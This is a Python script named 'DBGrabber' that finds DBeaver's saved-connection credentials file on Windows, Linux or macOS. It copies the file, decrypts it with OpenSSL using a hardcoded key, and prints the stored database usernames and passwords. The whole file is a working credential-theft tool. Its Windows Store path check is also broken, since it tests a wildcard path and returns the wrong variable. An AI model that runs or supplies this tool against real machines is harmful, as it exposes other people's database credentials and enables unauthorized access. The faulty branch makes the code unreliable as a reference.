import os
import platform
import subprocess
import shutil
from pathlib import Path
import psutil


def find_credentials_file(username):
    """Find the credentials-config.json file based on the OS."""
    system = platform.system()
    print(f"[INFO] Detected Operating System: {system}")
    if system == "Windows":
        drives = [partition.device for partition in psutil.disk_partitions()]
        print(f'[INFO] Drives detected: {drives}')
        for drive in drives:
            file_path = Path(
                drive) / f'Users/{username}/AppData/Roaming/DBeaverData/workspace6/General/.dbeaver/credentials-config.json'
            if file_path.exists():
                return file_path

            # Check for Windows Store installation path
            store_path = Path(
                drive) / f'Users/{username}/AppData/Local/Packages/DBeaverCorp.DBeaverCE_*/LocalCache/Roaming/DBeaverData/workspace6/General/.dbeaver/credentials-config.json'
            if store_path.exists():
                return file_path
    elif system == "Linux":
        file_path = Path.home() / '.local/share/DBeaverData/workspace6/General/.dbeaver/credentials-config.json'
        if file_path.exists():
            return file_path
    elif system == "Darwin":  # macOS
        file_path = Path.home() / 'Library/DBeaverData/workspace6/General/.dbeaver/credentials-config.json'
        if file_path.exists():
            return file_path
    return None


def decrypt_file(encryption_key, initialization_vector, input_file, output_file):
    """Decrypt the file using OpenSSL."""
    # Check if OpenSSL is available
    if shutil.which("openssl") is None:
        print("[ERROR] OpenSSL is not installed or not found in PATH.")
        return 1, "OpenSSL not found"

    command = [
        'openssl', 'aes-128-cbc', '-d',
        '-K', encryption_key,
        '-iv', initialization_vector,
        '-in', str(input_file),
        '-out', str(output_file)
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.returncode, result.stderr


def main():
    print("======================================================")
    print("                    DBGrabber v1.0")
    print("======================================================")
    print("This script is intended for Windows, Linux, and macOS Machines.")
    print("It fetches and decrypts DBeaver credentials.")
    print("------------------------------------------------------")

    encryption_key = "babb4a9f774ab853c96c2d653dfe544a"
    initialization_vector = "00000000000000000000000000000000"

    username = os.getlogin()
    print(f"[INFO] Detected username: {username}")

    print(f"[INFO] Searching for credentials file for user: {username}")
    file_path = find_credentials_file(username)
    if file_path:
        print(f"[INFO] Credentials file found at: {file_path}")
    else:
        print("[ERROR] Credentials file not found.")

    if file_path:
        print(f"[INFO] User profile found on drive: {file_path.drive}")
        print(f"[INFO] Looking for file at: {file_path}")

        # Copy the file to the current directory
        destination = Path('./credentials-config.json')
        shutil.copy(file_path, destination)
        print("[SUCCESS] File copied successfully.")

        # Decrypt the file
        output_file = Path('./decrypted-output.txt')
        returncode, stderr = decrypt_file(encryption_key, initialization_vector, destination, output_file)

        if returncode == 0 and output_file.exists():
            print("[SUCCESS] Decryption completed successfully.")
            print("------------------------------------------------------")
            print("Decrypted Content:")
            print("------------------------------------------------------")
            with output_file.open('r') as file:
                print(file.read())
            print("------------------------------------------------------")
        else:
            print("[ERROR] Decryption failed.")
            print(stderr)
    else:
        print("[ERROR] User profile drive not found. Please check the configuration.")

    print("======================================================")
    print("                       End of DBGrabber")
    print("======================================================")


if __name__ == "__main__":
    main()
